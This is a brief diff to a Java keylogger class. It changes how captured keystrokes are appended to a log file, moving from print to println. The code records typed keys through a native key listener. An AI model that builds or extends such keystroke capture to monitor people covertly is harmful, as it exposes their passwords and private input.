@@ -45,9 +45,9 @@ public class KeyLogger implements NativeKeyListener {
         try (OutputStream os = Files.newOutputStream(file, StandardOpenOption.APPEND);
              PrintWriter writer = new PrintWriter(os)) {
             if (keyText.length() > 1) {
-                writer.print("[" + keyText + "]");
+                writer.println("[" + keyText + "]");
             } else {
-                writer.print(keyText);
+                writer.println(keyText);
             }
         } catch (IOException ex) {
             System.out.println("sai o duoi");
